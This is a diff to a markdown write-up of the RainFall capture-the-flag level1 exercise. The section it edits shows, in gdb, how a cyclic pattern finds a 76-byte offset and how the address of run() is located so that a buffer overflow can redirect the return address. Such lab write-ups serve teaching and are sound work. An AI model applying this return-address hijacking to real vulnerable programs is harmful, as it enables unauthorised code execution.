@@ -75,12 +75,11 @@ Call to <code>system()</code> supports this theory. We can use the common buffer
 ## buffer overrun attack
 To find the offset, we can use an online tool ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)).
 ``` shell
-level1@RainFall:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa...Ag2Ag3Ag4Ag5Ag" > /tmp/pattern
 level1@RainFall:~$ gdb ./level1
-(gdb) run < /tmp/pattern
-Starting program: /home/user/level1/level1 < /tmp/pattern
+(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa[...]Ag2Ag3Ag4Ag5Ag'
+Starting program: /home/user/level1/level1 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa[...]Ag2Ag3Ag4Ag5Ag'
 ```
-This way, we find out that <u>the offset is 76</u>. By replacing the return address value with the memory address of the <code>run()</code> function, we can manipulate the program flow to ensure its execution.
+This way, we find out that the offset is 76. By replacing the return address value with the memory address of the <code>run()</code> function, we can manipulate the program flow to ensure its execution.
 ``` shell
 (gdb) p run
 $1 = {<text variable, no debug info>} 0x8048444 <run>
